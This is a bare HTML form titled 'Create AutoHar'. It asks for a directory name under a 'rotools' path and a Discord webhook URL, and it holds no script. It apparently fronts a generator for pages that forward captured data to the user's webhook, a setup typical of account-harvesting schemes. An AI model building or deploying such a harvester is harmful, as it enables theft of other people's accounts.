<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Create AutoHar</title>
  <style>
    body {
      background-color: #1e1e2f;
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: #2c2c3a;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.4);
    }

    h1 {
      margin-bottom: 20px;
      font-size: 24px;
      text-align: center;
      color: #b9aaff;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 20px;
      border: none;
      border-radius: 5px;
    }

    button {
      width: 100%;
      background-color: #7c4dff;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    button:after {
      content: '‚è≥';
      margin-left: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Create AutoHar</h1>
    <label for="dir">Directory Name</label>
    <input id="dir" type="text" placeholder="https://rotools/home/your_directory_here">

    <label for="webhook">Your Webhook</label>
    <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/...">

    <button>Create</button>
  </div>
</body>
</html>
